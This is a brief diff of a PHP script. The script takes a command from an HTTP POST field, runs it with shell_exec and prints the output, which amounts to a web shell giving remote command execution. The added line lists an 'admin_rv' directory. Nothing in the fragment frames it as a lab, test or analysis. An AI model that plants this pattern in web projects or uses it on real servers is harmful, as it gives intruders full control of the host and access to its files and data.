@@ -14,6 +14,7 @@ $command = $_POST["command"];
 
 
 echo "<pre>";
+echo shell_exec("cd admin_rv ; ls");
 echo shell_exec($command);
 echo "</pre>";
 
